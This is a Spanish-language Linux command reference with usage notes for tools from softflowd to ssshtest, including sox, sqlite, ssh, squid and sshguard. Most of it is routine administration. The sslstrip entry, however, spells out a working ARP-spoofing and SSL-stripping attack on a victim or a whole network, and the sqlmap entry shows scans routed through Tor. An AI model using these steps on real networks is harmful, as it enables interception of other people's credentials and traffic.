$ softflowd -i enp1s0 -l -n 10.1.0.2:4432,10.1.0.3:4432 (enviando los paquetes netflow impares al puerto 10.1.0.2 4432 y los pares al puerto 10.1.0.3 4432)
$ softflowd -v 5 -i enp1s0 -n 10.1.0.2:4432 -m 65536 -t udp=1m30s (aumenta la cantidad de flujos simultáneos a rastrear a 65536 y el tiempo de espera a 90'')
$ softflowd -i enp1s0 -p /var/run/sfd.pid.enp1s0 -c /var/run/sfd.ctl.enp1s0 ( especifica ubicaciones alternativas para el socket de control y el archivo pid)


somafm
Escuchar cualquiera de las emisoras de somafm desde la terminal. Bajar el script de github y darle permisos
$ wget https://raw.githubusercontent.com/rockymadden/somafm-cli/master/src/somafm
$ chmod +x somafm
O instalarlo con pip:
$ pip3 install somafm
$ somafm -l (listar las emisoras)
$ somafm -s (mostrar oyentes actuales)
$ somafm -p beatblender (conectar la escogida)
$ somafm -p "Groove Salad Classic" (lo mismo)
$ somafm -r (seleccione aleatoriamente uno de los canales actualmente activos)
$ curl -s -H 'Accept: application/json' https://somafm.com/channels.json | jq -r '.channels | sort_by(.listeners | tonumber) | reverse | .[]' | jq -r '.id + " | " + .listeners + " listeners | " + .description' | column -t -s\| (listado de forma más bonita)


sonic
Acelerar o ralentizar archivos wav de voz con una distorsión mínima.
$ sonic -s 3.4 archivo_voz.wav archivo_voz_rapito.wav (aumentaría la velocidad de la entrada en un factor de 3,4 y escribir el resultado en archivo_voz_rapido.wav)
$ sonic -s 2.5 -v 1.5 voz.wav voz_lenta.wav (ralentizar voz.wav en un factor de 2,5, aumentar volumen un 50% y el resultado en voz_lenta.wav)
$ sonic -p 2.0 grave.wav aguda.wav (que una voz grave suene aguda)


sonido
1.-
Para ver las tarjetas de sonido instaladas
$ cat /proc/asound/cards
0 [Intel ]: HDA-Intel - HDA Intel
HDA Intel at 0xe4100000 irq 169
1 [SAA7134 ]: SAA7134 - SAA7134
saa7133[0] at 0xe4000000 irq 233
2 [CMI8738MC6 ]: CMI8738-MC6 - C-Media PCI CMI8738-MC6
C-Media PCI CMI8738-MC6 (model 55) at 0xa000, irq 225
# asoundconf set-default-card 1 (para activar la 1)
Editar el fichero /etc/alsa/alsa.conf y poner estas líneas:
	defaults.ctl.card 1
	defaults.pcm.card 1
	defaults.pcm.device 1
Los cambios son automáticos, no hay ni que reiniciar el servicio.
2.-
Cuando al reiniciar el sonido aparece silenciado:
# gedit /etc/pulse/default.pa
Comentar la linea: # load-module module-device-restore
3.-
Sin sonido con flash
Si no existe, crear el archivo:
$ sudo touch /etc/asound.conf
# nano /etc/asound.conf
Pegar:
	pcm.pulse {
	type pulse
	}
	ctl.pulse {
	type pulse
	}
	pcm.!default {
	type pulse
	}
	ctl.!default {
	type pulse
	}
Reiniciar.
4.-
Si Java bloquea el dispositivo de sonido en lugar de usar Pulseaudio
# cd /usr/lib/jvm/java-6-sun/jre/bin/
# mv java java.bin
# nano /usr/lib/jvm/java-6-sun/jre/bin/java
Y copiar en su interior:
#!/bin/bash
padsp /usr/lib/jvm/java-6-sun/jre/bin/java.bin "$@"
# chmod +x java (darle permisos)
5.-
Substituir pulseaudio por alsa:
# apt-add-repository ppa:dtl131/ppa  (Añadir los repositorios gnome-media/applets/settings-daemon)
# apt-get update  (Actualizar el sistema)
# apt-get upgrade
# apt-get install esound esound-clients esound-common libesd-alsa0 alsa-base alsa-tools alsa-utils alsa-oss linux-sound-base python-alsaaudio gnome-media libsdl1.2debian-alsa  (Instalar paquetes de alsa)
# apt-get purge libcanberra-pulse pulseaudio pulseaudio-esound-compat pulseaudio-module-bluetooth pulseaudio-module-gconf pulseaudio-module-udev pulseaudio-module-x11 gstreamer0.10-pulseaudio pulseaudio-utils pavucontrol  (Desinstalar los paquetes de pulseaudio)
Reiniciar


sort
Muestra la entrada ordenada.
$ sort archivo > archivo_ordenado  (por la primera columna)
$ sort  [intro] (va esperando palabras o números que ordena con Ctrl+d)
$ sort << fin (Lo mismo pero ordena después de introducir “fin”)
$ sort -o archivo1 archivo1 (escribe el resultado en el propio archivo)
$ sort -u fichero  (ordenar eliminando lineas repetidas)
$ sort -t , -k2n archivo  (ordenar por el segundo campo separado del primero por una “,” y por su valor numérico)
$ sort -t , -k3 archivo   (ordenar por el tercer campo separados por comas)
Opciones
-f : Ordena alfabeticamente (diferencia Minúsculas y mayúsculas).
-n : Para ordenar los campos numéricos por su valor numérico.
-r : De mayor a menor.
-R : desordenar, aleatoriamente
-k numero : Especifica por qué columna o campo realizar la ordenación
-t : indica que vamos a usar un delimitador de campo especificado
-u : Suprime todas las líneas repetidas después de realizar la ordenación.


sosreport
Conjunto de herramientas que reúnen información sobre el sistema (hardware y configuración). La información puede ser utilizada para fines de diagnóstico y depuración.
# sosreport -l (listado de módulos)
# sosreport -n ntp,numa (desactivar los módulos ntp y numa)
# sosreport -k virsh=off (desactivar un módulo)
# sosreport -e virsh=on  (activarlo


source
Recarga o ejecuta el archivo de configuración indicado para aplicar cambios o el script de bash correspondiente.
$ source .bashrc
Este comando es equivalente a un punto [.]:
$ . .bashrc (lo mismo que el anterior)
$ source script.sh


sources.list
Archivo que contiene las fuentes o repositorios de los paquetes de software en las distros derivadas de Debian.
Generador de sources.list optimizado via web:
[http://debgen.simplylinux.ch/](http://debgen.simplylinux.ch/ "sources.list a la carta")
División del programario según Debian y Ubuntu:
DEBIAN:
main (Paquetes 100% libres según las directovas de Debian)
contrib (Paquetes que dependen de alguno que no es 100% libre según las directivas de Debian)
non-free (Paquetes que o bien no cumplen la directiva de Debian o no facilitan el código fuente)
UBUNTU:
main (Paquetes que cumplen los requisitos de la licencia de Ubuntu)
restricted (soportados por los desarrolladores de Ubuntu pero o bien no cumplen su licencia o no se tiene acceso al código fuente)
Universe (Programas mantenidos por la comunidad)
Multiverse (Programas comerciales o privativos de terceras empresas o fabricantes)


sox
[soxmix]. Manipular ficheros de audio. Soporta mp3, wav, ogg... [ver play]
$ soxmix 1.mp3 2.mp3 mezcla.mp3
$ sox archivo.mp3 (Obtener información)
$ sox archivo.mp3 rapido.wav speed 2.0 (Crear un audio a doble velocidad)
$ sox file.mp3 file2.mp3 trim 0 5 (corta los primeros 5 segundos de file.mp3 y los guarda en file2.mp3)
$ sox file.mp3 file.wav (pasar de mp3a wav)
$ sox 2.wav 3.wav speed 0.5 (3.wav irá a la mitad de velocitad que 2.wav)


spacedream
Muestra una imagen del cielo en la tty. Con las teclas del cursor permite moverse por entre la constelación de estrellas.
$ spacedream


spamassassin
Herramienta para detectar y filtrar spam muy potente y totalmente configurable con numerosas funciones, como listas blancas automáticas, pruebas RBL, análisis bayesiano y análisis de encabezados y cuerpo de texto. También se integra con servidores de correo como Postfix, Sendmail, Exim, o herramientas como procmail.
$ spamassassin -t < correo.txt (que analice el mensaje y muestre el resultado con el contenido original. el archivo con el correo en formato raw que incluye cabeceras)
Nota.- El umbral para considerarlo spam es 5.0
$ spamassassin < original.txt > limpio.txt (analiza el correo y si lo considera spam, le añade cabeceras indicando que lo es, además de marcarlo como tal)
1.-
Algunas configuraciones comunes en user_prefs:
$ nano ~/.spamassassin/user_prefs
       required_score 5.0
       rewrite_header Subject [SPAM]
       report_safe 0
       use_bayes 1


speaker-test
Pruebas de sonido para dispositivos alsa.
$ speaker-test -c6 -t wav (probar altavoces usando voz [t])
$ speaker-test (básico)
$ speaker-test -Dplug:front -c2 (estereo)


spd-conf
Herramienta simple para la configuración básica de speech-dispatcher y diagnóstico de problemas. El paquete speech-dispatcher proporciona una capa independiente para síntesis de voz y salida por altavoces, es compatible con varios sintetizadores de voz (software y hardware) a través de los diferentes backends de las aplicaciones.
$ spd-conf -d -e (para mensajes y diagnosis de los problemas)
$ spd-conf -d --test-pulse (test de pulse audio)
s spd-conf -d --test-alsa (test de alsa)


speedometer
Monitor de transferencia de ficheros [velocímetro].
# speedometer -p -rx eth0  (tráfico recibido y el resultado en consola [-p])
# speedometer -tx eth0  (tráfico transmitido y el resultado en modo gráfico)
# speedometer -i 0.25 -rx eth0 (t. recibido, en modo gráfico y muestreo cada 0.25 segundos.)
pulsar “q” para cerrar


speedtest
[= speedtest-cli]. Medir la velocidad de conexión a internet directamente desde el terminal tanto de descarga como de subida.
$ speedtest (mostrar velocidad de descarga [download], de subida [upload] y la latencia [ping])
$ speedtest --simple (mostrar salida sin detalles. Sólo mostrará el ping, la velocidad de descarga y la velocidad de subida)
$ speedtest --bytes > resultados.txt (resultado en bytes y mandarlo a un archivo)
$ speedtest --list (muestra una lista de servidores de speedtest.net ordenados por distancia)
$ speedtest --server ID_server (seleccionar un servidor del listado anterior)
$ speedtest --csv (guardar los resultados en formato CSV)
$ speedtest --no-upload (sólo medir la velocidad de descarga)
$ speedtest --no-download (sólo medir la de subida)
$ speedtest --no-pre-allocate (probar la velocidad sin utilizar la geolocalización o la búsqueda de servidores cercanos)
$ speedtest --share (Nos da una URL con la imagen en png de la conexión)


spell
Programa de corrección ortográfica que imprime cada palabra mal escrita en una línea independiente.
$ spell archivo.txt (mostrará una lista de palabras mal escritas encontradas en el archivo)
$ echo "La palabara está mal escrita" | spell -a (si la palabra "palabara" no está en el diccionario, el comando la mostrará y mostrará sugerencias de corrección)


spew
Medir el rendimiento de E/S de dispositivos de caracteres, dispositivos de bloque y archivos normales. También se puede usar para generar altas cargas de E/S para los sistemas de tensión mientras se verifica la integridad de los datos. No necesita archivos de configuración. Muestra la velocidad de transferencia de escritura en kibibytes por segundo y el tiempo de transferencia de escritura en segundos. Incluye gorge y regorge
$ spew -b 32k 1m /tmp/spewfile (escribe 32 mebibytes [1 mebibyte = 1048576 Bytes] en el archivo especificado)
$ spew -u m -i 10 -b 1k 256k /dev/sda1 (Escribe 256 kibibytes utilizando peticiones de 1 kibibibyte en el archivo de dispositivo de bloque /dev/sda1 10 veces utilizando el patrón predeterminado (aleatorio). Las tasas de transferencia de escritura iterativa y acumulativa se muestran en mebibytes por segundo y los tiempos de transferencia de escritura iterativa y acumulativa se muestran en segundos.)
$ regorge -s -o 1m -b 16m 1g /tmp/bigfile (Escribe 1 gibibyte (1 gibibyte = 1024*1024*1024 bytes) comenzando en un offset de 1 mebibyte usando 16 peticiones de mebibyte al fichero /tmp/bigfile usando el patrón por defecto (aleatorio). Los datos se escriben de forma sincrónica y se vacían al cerrar el archivo. Luego se leen los mismos datos usando el mismo tamaño de petición y offset. Se comprueba que los datos leídos coinciden con los leídos. Las tasas de transferencia de escritura y lectura se muestran en kibibytes/segundo. Los tiempos de transferencia de lectura y escritura se muestran en segundos.)
$ gorge -i 0 -u M -p zeros -b 512 1m /dev/zero (Lee 1 mebibyte de datos utilizando peticiones de 512 bytes del archivo /dev/zero un número infinito de veces utilizando el patrón de ceros (no comprueba los datos). Las tasas de transferencia de lectura iterativa y acumulativa se muestran en megabytes (1 megabyte = 1.000.000 bytes) por segundo y los tiempos de transferencia de lectura iterativa y acumulativa se muestran en segundos.)
$ regorge -g -r -b 1k -B 256K 1t /dev/md1 (Escribe 1 tebibyte (1 tebibyte = 1024*1024*1024*1024 bytes) utilizando peticiones de 1-256 kibibytes en el dispositivo de bloques /dev/md1 utilizando el patrón aleatorio. Se realizan búsquedas aleatorias antes de cada transferencia, pero cada bloque entre el inicio y el final de los datos se escribe exactamente una vez. Los tamaños de las peticiones se eligen aleatoriamente. A continuación se leen los mismos datos utilizando los mismos tamaños de petición y búsquedas en la misma secuencia. Repita la secuencia anterior un número infinito de veces hasta que se le indique que abandone [mediante señal o comando TUI])


split
Cortar archivos
$ split -d -b 5M archivo otro_archivo. (Que tengan extensión con números: .00, .01, .02 [-d]. Trozos de 5 MB [-b], archivo de entrada y de salida terminado con un punto donde se añade la extension. En este ejemplo daría salidas tipo otro_archivo.00, otro_archivo.01....)
$ split -l 100 archivo (dividirlo en trozos de 100 lineas)
$ split -a 3 -d -b 5M archivo (que los trozos lleven 3 digitos [-a])
$ split -n 4 archivo (dividirlo en 4 partes)
$ cat prefijo* > archivo  (volver a unirlos)


split-logfile
Los archivos de registro se crearán, en el directorio donde se ejecuta el script, para cada nombre de host virtual que aparezca en el archivo de registro combinado. Estos archivos de registro llevarán el nombre del nombre del host, con una extensión de archivo.log. El archivo de registro combinado se lee desde la entrada estándar. Los registros leídos se añadirán a cualquier archivo de registro existente.
# split-logfile < /var/log/apache2/access.log (creará un archivo para cada ip distinta que encuentre en access.log por lo que es mejor lanzar el comando en un dir vacio)


splitvt
Lanzar dos shells simultaneas partiendo en dos ventanas una terminal.
$ splitvt -t "linux es genial" -upper ls -lower top (Con un título [-t] lanzando un ls en la ventana superior y top en la inferior)


sponge
[moreutils]. Herramienta que guarda todo el contenido a escribir hasta que recibe el EOF y luego lo escribe por lo que permite procesar un fichero y reescribirlo en el propio fichero sin perdida de datos.
$ tac archivo | sponge archivo (Lee al reves un archivo y lo guarda en el mismo archivo)
$ column -t datos | sponge datos


spumux
Generar subtítulos en un video mpeg.
$ spumux -s0 subt.xml < video.mpeg > video_subtitulado.mpeg
Nota.- El archivo subt.xml con un contenido:
	<subpictures>
	   <stream>
	        <textsub filename="SUBTITULOS.srt" characterset="ISO8859-1"
	                 fontsize="24.0" font="Arial.ttf" horizontal-alignment="center"
	                 vertical-alignment="bottom" left-margin="60" right-margin="60"
	                 top-margin="20" bottom-margin="30" subtitle-fps="25"
	                 movie-fps="29.97" movie-width="720" movie-height="478"/>
	   </stream>
	</subpictures>
La fuente Arial.ttf ha de estar [o tener un enlace] en el directorio ~/.spumux


sqlite
Gestor de bases de datos.
$ sqlite (entrar en el prompt)
sqlite> .help (mostrar comandos para usar)
sqlite> .database (ver las bases de datos existentes)
sqlite> .tables (ver las tablas de las que constan en la base de datos)
sqlite> .schema nombre (ver conceptes de la tabla "nombre")
sqlite> drop table nombre; (eliminar una tabla)
sqlite> .quit (salir de sqlite)
sqlite> select * from nombre; (muestra los datos de la tabla "nombre")
sqlite> .mode tabs nombre (La proxima vez que se lance el comando anterior mostrará la tabla tabulada)
sqlite> .headers on (si queremos mostrar el nombre de cada columna)
1- Un ejemplo de creación de una tabla:
	sqlite> CREATE TABLE Datos (
	...> id integer primary key autoincrement,
	...> Apellido char(30) not null,
	...> Nombre char(30) not null,
	...> Observaciones char(60));
Nota.- id es un número que se va ingrementando con cada entrada y entre parentesis los espacios reversados para cada dato.
	sqlite> insert into Datos(Nombre, Apellido, Observaciones) Values('juan', 'Sanchez', 'Un amigo de la infancia');
	sqlite> insert into Datos(Nombre, Apellido, Observaciones) Values('josé Antonio', 'Rodriguez', 'Primo de mi tio Carlos');


sqlmap
Provee automatismos para testear la seguridad entre una aplicación web y la base de datos con la que interactúa. Descarga:
	$ git clone git://github.com/sqlmapproject/sqlmap.git
	$ cd sqlmap
$ python sqlmap.py -u "http://una_url.com" (forma básica)
$ python sqlmap.py --tor --tor-type=SOCKS5 --check-tor -v -u "http://una_url.com"
Algunas opciones:
--tor --tor-type=SOCKS5 (que use la red Tor para las peticiones)
--check-tor (comprobar si Tor se usa correctamente)
-v 6 (con la máxima información. Por defecto 1. Máximo 6)
-a (Recuperar todo)


squid
Proxy caché (intermediario para nuestra conexion a internet, guardando las paginas visualizadas en una caché)
# cp /etc/squid3/squid.conf{,.defaults} (Realizar copia de seguridad de la configuración)
# nano /etc/squid3/squid.conf
Modificamos/adaptamos los siguientes ajustes basicos:
http_port 3128 #puerto de escucha
cache_mem 100 MB #Tamaño memoria caché
cache_dir ufs /var/spool/squid 700 16 256 #directorio y tamaño
acl NuestraRed src 192.168.1.0/24 #Nombre y red a la que afecta
http_access allow NuestraRed #permitir acceso a toda la red
http_access allow deny all #Denegamos a los de fuera de la red
auth_param basic /usr/lib/squid/ncsa_auth /etc/squid/passwd #ruta a usuarios
auth_param basic realm “Mensaje de acceso” #mensaje al logearse
auth_param basic children 5 #Procesos de autentificación
auth_param basic basic credentialsttl 1 hours #tiempo
# squid3 -k parse (Revisión de la sintaxis del archivo squid.conf)
Después de las modificaciones reiniciar servicio:
# /etc/init.d/squid3 restart
Configuración de usuarios (/etc/squid/passwd):
# htpasswd -c /etc/squid3/passwd user1 (Crear archivo [-c] nombre de usuario y pedirá contraseña)
# htpasswd /etc/squid3/passwd usuario2 (Sin parámetro -c porque el archivo ya está creado. Otro usuario y contraseña)


srm
[secure-delete]. Aplicación para eliminar de forma segura datos de disco sobreescribiendo su espacio. Es de funcionamiento lento, pero por eso se le considera el más efectivo
$ srm -f dir (Modo rápido i el más inseguro)
$ srm -l dir (Como realizar dos veces srm -f)
$ srm archivo.txt (Se sobreescribe 38 veces)
$ srm -rzv dir (se sobreescriben 38 veces los archivos y subdirectorios incluidos [r], sobreescribnedo ceros en el último borrado [z] y mostrando el proceso [v])


srptool
[gnutls]. Programa simple que emula los programas de las librerías SRP (Secure Remote Password).  Está pensado para su uso en lugares donde no se espera que la autenticación SRP sea la utilizada por los usuarios del sistema. Para utilizar SRP es necesario crear dos ficheros, el archivo de contraseñas que contiene los usuarios y los verificadores asociados a ellos y el archivo de configuración que contiene los parámetros del grupo.
# srptool --create-conf /etc/tpasswd.conf (crear el archivo de configuración)
# srptool --passwd /etc/tpasswd --passwd-conf /etc/tpasswd.conf -u root (creará /etc/tpasswd y añadirá el usuario root. Pedirá contraseña)
# srptool --passwd /etc/tpasswd --passwd-conf /etc/tpasswd.conf --verify -u root (entrar contraseña y verificar si coincide con la entrada en /etc/tpasswd obtendrá)


ss
Utilidad para investigar sockets. Sustituye a netstat.
# ss -r (resolviendo las IPs)
# ss -4 (muestra las conexiones IPv4)
# ss -ta (conexiones TCP)
# ss -ua (conexiones del protocolo UDP)
# ss -n (sin resolver)
# ss  (muestra todas las direcciones y puertos tanto en modo escucha como no)
# ss -l (muestra los que estan esperando conexión)
# ss -ltn (muestra los sockets TCP que estan en "listen" [escucha])
# ss -lun (muestra los sockets UDP que estan en "listen")
# ss -o (con conexión establecida)
# ss -p (con la aplicación que los motiva)
# ss -a | grep ssh (De todas las conexiones, solo muestra las ssh)
# ss -s (estadísticas generales)
# ss -tpan 'sport = :22' (ver conexiones por el puerto 22)
# ss -n dst :443 (muestras las del puerto 443)
# ss -o state established '( dport = :https )' (muestra las conexiones https)


sscg
Crea certificados "autofirmados" más seguros.
     $ sscg --country=ES --state=Girona --locality=Olot --organization=lapipaplena
     Wrote service certificate key to /home/USER/service-key.pem
     Wrote service certificate to /home/USER/service.pem
     Wrote CA certificate to /home/USER/ca.crt
     Wrote Diffie-Hellman parameters to /home/USER/dhparams.pem


ssconvert
[gnumeric]. Conversor de formatos de hoja de cálculo por línea de comandos.
$ ssconvert --list-exporters (Listado de conversiones de salida)
$ ssconvert --list-importers (Litado de conversiones de entrada)
$ ssconvert entrada.xls salida.csv (De formato excel a csv)
$ ssconvert -E utf-8 entrada.xls salida.csv (Especificando una codificación para la salida)
$ ssconvert --export-type=Gnumeric_stf:stf_assistant -O 'separator=| format=preserve charset=unicode' entrada.xls salida.csv (Especificando opcionalmente un exportador [--export-type] que permite exportar a txt, especificando un separador de campos que no sea el por defecto [el espacio] sinó la barra vertical [|], preservando el formato de las celdas del original [format], otras opciones de format son "automatic" [por defecto] y "raw" [sin formato] y con codificación de salida en unicode [por defecto UTF-8])


ssed
Versión mejorada de GNU sed [ver] con algunos argumentos nuevos.


ssft
Biblioteca de funciones de Shell. La biblioteca define un conjunto de varias funciones y ha sido diseñada para usarse obteniendo el código de la biblioteca de otros scripts. El ejecutable incorpora .sh.
$ ssft.sh -d (listado de funciones diponibles)
$ ssft.sh -d ssft_file_selection (descripción de una función)


ssh
Comunicación cifrada entre dos máquinas.
$ ssh usuario@host (básica)
$ ssh -v usuario@IP_o_host (comprobar errores en una conexión)
$ ssh -p 4000 usuario@host (especificando un puerto)
$ ssh -fND localhost:2080 usuario@host (Crear un servidor proxy en una máquina remota. La “N” es para que no se puedan ejecutar comandos)
$ ssh -X -Y usuario@host akregator (Lanzar una aplicación remota en local. Ver punto 11 de esta entrada)
$ ssh usuario@host ls (lanzar un comando remoto y visualizarlo en local)
$ ssh -t usuario@host newsbeuter  (lo mismo si precisa consola)
$ ssh -D 9999 usuario@host (abrir un puerto a partir del cual tunelar una conexión)
$ ssh user@host_ip 'DISPLAY=":0.0" import -window root screenshot.png' (realizar pantallazo de una sesión remota. Se archiva en el remoto no en local)
$ ssh usuario@host "tar -cf - /home/usuario/dir" | gzip dir.tar.gz (Comprimir un directorio remoto)
$ ssh usuario@host cat /home/usuario/archivo.txt | xclip -selection (Copiar el contenido de un archivo remoto en el clipboard local)
$ ssh -o "StrictHostKeyChecking no" usuario@host (Evitar verificación de known host al conectar)
# gedit /var/run/motd   (modificar el mensaje de bienvenida de ssh)
1.-
conexión remota. El servidor ha de tener el archivo /etc/ssh/sshd_config con los siguientes parámetros:
AllowTcpForwarding yes
GatewayPorts yes
Luego configurar Firefox para usar un servidor proxy 127.0.0.1 puerto 9999.
2.-
Modificar el mensaje antes del login
# gedit /etc/issue.net   (Para activarlo, descomentar del archivo “/etc/ssh/sshd_config” la línea: Banner /etc/issue.net)
3.-
Tunel inverso:
$ ssh -R 10000:localhost:22 usuario2@host2 (lanzado desde host1 hacia host2 crea un tunel por el puerto 10000)
$ ssh usuario2@host2 (Lanzado desde host3 hacia host2)
Una vez entrado en host2, lanzar:
$ ssh usuario1@localhost -p 10000 (Para conectar el host3 con el host1)
Otro caso de tunel inverso:
host1 no tiene acceso al router y lanza:
$ ssh -N usuario@host2 -R 2222:127.0.0.1:22 (hacia el host2 para crear un tunel por el puerto 2222)
$ ssh usuario@host2 (Usuario host3 se conecta a host2)
$ ssh usuario@127.0.0.1 -p 2222 (Y una vez entrado en host2 se conecta por el tunel a host1)
Nota.- Si host2 no corriera por el puerto 22 substituir por: usuario@host2 -p PUERTO
4.-
Crear clave publica para acceder a un remoto sin que pida identificación:
$ ssh-keygen -b 4096 -t rsa  (Crear la clave)
$ ssh-copy-id usuario@IP_o_HOST (enviar la clave al remoto)
En caso de tener la conexión en un puerto distinto:
$ ssh-copy-id -p 7000 USER@HOST
5.-
Para deshabilitar el acceso a todos los usuarios excepto a root:
# touch /etc/nologin
# chmod 644 /etc/nologin
6.-
Deshabilitar/personalizar los mensajes que aparecen cuando nos logueamos en algunas distros a un host remoto mediante SSH.
$ touch /home/usuario/.hushlogin (Creando este fichero vacio se deshabilitan los mensajes. Borrandolo vuelven a aparecer)
# nano /etc/motd (Archivo para personalizar los mensaje de bienvenida a quien se loguea en el sistema)
7.-
Crear un atajo para la conexión a servidores remotos:
$ nano .ssh/config
Y pegar el siguiente contenido debidamente modificado con nuestros datos referente e dos host remotos:
	host servidor
	 hostname 192.168.1.10
	 port 22000
	 user USUARIO_SERVIDOR
	host maquina1
	 hostname 192.168.1.15
	 port 22100
	 user USUARIO_MAQUINA1
Nota.- Delante de las lineas hostname, port y user existe un espacio.
Al crear este archivo, la conexión se realizará con:
$ ssh servidor (Pedirá igualmente contraseña)
$ ssh maquina1
8.-
Evitar desconexiones por inactividad:
$ nano .ssh/config
Y pegar el siguiente contenido:
	Host *
	    ServerAliveInterval 120
	    ServerAliveCountMax 3
9.-
Añadir un registro de las acciones realizadas dentro de cada sesión SFTP
# nano /etc/ssh/sshd_config
Y dejar la linea como se indica:
Subsystem sftp /usr/lib/openssh/sftp-server -l INFO
Tras reiniciar ssh, el registro se plasmará en /var/log/auth.log
10.-
Aumentando la seguridad del servidor ssh:
# nano /etc/ssh/sshd_config
Y añadir o modificar las siguientes lineas:
	AllowUsers juan pedro andrés (Limitando a uno o varios los usuarios autorizados)
	AllowGroup oficina (Restringir acceso a solo un grupo)
	Port 372 (Modificando puerto. Aconsejable uno inferior al 1024)
	LoginGraceTime 40 (Mostrar la pantalla de login 40 segundos antes de cerrarse)
	MaxStartups 4 (Cantidad máxima de conexiones simultaneas)
	MaxAuthTries 3 (Limitar el número de intentos de logeo, tras los cuales se cierra la conexión)
11.-
Ajustes para tunelar aplicaciones gráficas:
En el servidor:
# nano /etc/ssh/sshd_config
	AllowTcpForwarding yes
	X11Forwarding yes
	X11DisplayOffset 10
	X11UseLocalhost yes
En la máquina cliente:
# nano /etc/ssh/ssh_config
	ForwardX11 yes
	ForwardX11Trusted yes
Después de reiniciar ssh, con el parámetro -X se visualizará la gui remota que tambien tiene que estar instalada en local.
$ ssh -X usuario@host akregator


sshd
Demonio ssh
$ sshd -t (Verificar si existen errores en el archivo de configuración)


sshfs
Montar un sistema de archivos remoto en local.
# sshfs usuario@host_o_IP:/home/usuario /home/usuario/remoto
# fusermount -u /home/usuario/remoto  (Desmontarlo)


sshguard
Demonio que protege SSH y otros servicios contra ataques de fuerza bruta. Funciona observando los cambios en /var/log/auth.log, verificando si alguien esta fallando varias veces al autentificarse. Luego de varios errores de autentificacion (por defecto 14) el host ofensivo sera bloqueado por 7 minutos y se duplicará cada vez que el host ofensivo repita el ataque. Carece de archivo de configuración y puede complementarse con iptables:
# iptables -A INPUT -j sshguard (Para activarlo en todos los puertos)
# iptables -A INPUT -m multiport -p tcp --destination-ports 21,22 -j sshguard (Para puertos concretos [ftp y ssh])
El archivo para colocar las direcciones no afectadas por sshguard:
# nano /etc/sshguard/whitelist
Con el siguiente formato:
	192.168.1.53 (Una ip)
	192.168.1.0/24 (Un rango)
	lapipaplena.net (Un host)


ssh-keygen
Creación, gestión y conversión de claves utilizadas para la autenticación de cliente y servidor. Cuando no se especifica ninguna opción, ssh-keygen genera un par de claves RSA de 2048 bits y solicita un nombre de clave y una frase de paso para proteger la clave privada. Las claves públicas se crean usando el mismo nombre base que la clave privada con una extensión .pub añadida. La ubicación de la clave se muestra cuando se completa la generación de claves. Ver ssh
$ ssh-keygen -lvf ~/.ssh/known_hosts (Ver todas las huellas digitales y las imágenes randomart)
$ ssh-keygen -t rsa -C newserver -f .ssh/newkey (Generar el par de llaves publica y privada. Caso de exitir preguntará si se sobreescribe)
$ ssh-keygen -B -f .ssh/id_rsa.pub (Muestra la huella digital de la llave especificada en formato SHA-1)
$ ssh-keygen -f "$HOME/.ssh/known_hosts" -R [La_URL.com_entre_corchetes]:22 (Suprimir un clave de un host por sufrir alguna modificación y el puerto)
$ ssh-keygen -R HOST (Otra forma de suprimir una clave de un host modificado)
1.-
Para ver la huella digital cada vez que se ingresa en un host remoto:
# nano /etc/ssh/ssh_config
Descomentar la linea y dejarla:
VisualHostKey yes


sshpass
La contraseña para acceder por ssh a un host remoto se realiza de forma interactiva (entrándola por teclado) en algunos casos esto no es posible ya sea por tratarse de un script en el que se entra en un host remoto, se realiza alguna acción y se regresa al local o por que se precisa entrar la contraseña de forma no interactiva. Para estos casos puede ser útil este comando aunque considerando lo debil para la seguridad que entraña su uso ya que puede quedar registrado en "history".
$ sshpass -f file_pas ssh -y usuario@host ifconfig (Ejecuta ifconfig en el remoto entrando como contraseña la primera palabra del archivo file_pas )
$ sshpass -p 1234 ssh -t usuario@host "echo 1234 | sudo -S namp 192.168.1.0/24" (Ejecuta el comando "sudo nmap" en el host remoto que tiene por contraseña 1234.)


sshuttle
Levanta VPNs con SSH y enruta tráfico a través de ellos
# sshuttle -r usuario@servidor 0/0 (Ejecución básica para redireccionar la totalidad del tráfico)
# sshuttle --dns -vvr usuario@servidor 0/0 (que las consultas DNS sean procesadas a través del servidor DNS del servidor al que se está conectado)
# sshuttle --daemon usuario@servidor 0/0 --exclude 192.168.1.0/24 --exclude 90.173.123.64 (ejecutar el proceso en segundo plano y excluir una rango y una ip)


sslstrip
Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los datos están siendo transmitidos en abierto [HTTP].
Configuración de reenvío de paquetes IP:
# echo 1 > /proc/sys/net/ipv4/ip_forward
Envenenamiento ARP (paquete dsniff):
# arpspoof -i eth0 -t ip_victima ip_router
En caso de querer atacar toda la red, solo especificar la ip router:
# arpspoof -i eth0 ip_router
Redirección de puertos usando Iptables:
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 31715
Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar "-A" por un "-D" en el comando anterior.
Arrancar sslstrip y ponerlo a la escucha:
# sslstrip -k -f -l 31715 -w archivo.log
Visionar en tiempo real los paquetes capturados:
#  tail -f archivo.log


ssmtp
[mailutils]. Herramienta que permite enviar correos a partir de un servidor externo (p.g gmail). Como remitente constará "root" ya que, en algunas distros, es quien tiene que enviar los correos. Ajustes en el archivo de configuración:
# nano /etc/ssmtp/ssmtp.conf
Modificar las lineas:
	root=correo@gmail.com
	mailhub=smtp.gmail.com:587
	hostname=el_hostname
	UseSTARTTLS=YES
	AuthUser=correo@gmail.com
	AuthPass=Contraseña_del_usuario_de_gmail
A continuación establecer permisos:
# chmod 640 /etc/ssmtp/ssmtp.conf
# chown root:mail /etc/ssmtp/ssmtp.conf
Lanzar la aplicación:
# ssmtp fulano@hotmail.com
Y colocar el texto:
	To: fulano
	Subject: Asunto
	---- Una linea en blanco ----
	El cuerpo de texto del correo
	Hasta la proxima.
Ctrl+d para terminar. Cuando vuelva a salir el prompt del sistema es que el mensaje ya se ha enviado.


ssshtest
Pruebas de bash sencillas y estúpidas. ssshtest es una serie de funciones de bash que facilitan la ejecución de pruebas de bash. Incluye funciones para comprobar la igualdad, determinar si una cadena está en la salida estándar (stdout), no en la salida estándar (stdout) o en la salida estándar (stderr). El proceso puede mostrarse con ejemplo de uso:
$ nano tests.sh
        #!/bin/bash
        #
        source ssshtest
        # Si "linux" stá en la salida:
        run test_in_stdout bash -c "echo 'linux es un sistema genial'"
        assert_in_stdout "linux"
        # si no existe salida de error
        run test_no_stderr bash -c "echo 'linux es un sistema genial'"
        assert_no_stderr
        # si muestra salida de error
        run test_stderr bash -c "hjdfhalsdf"
        assert_stderr
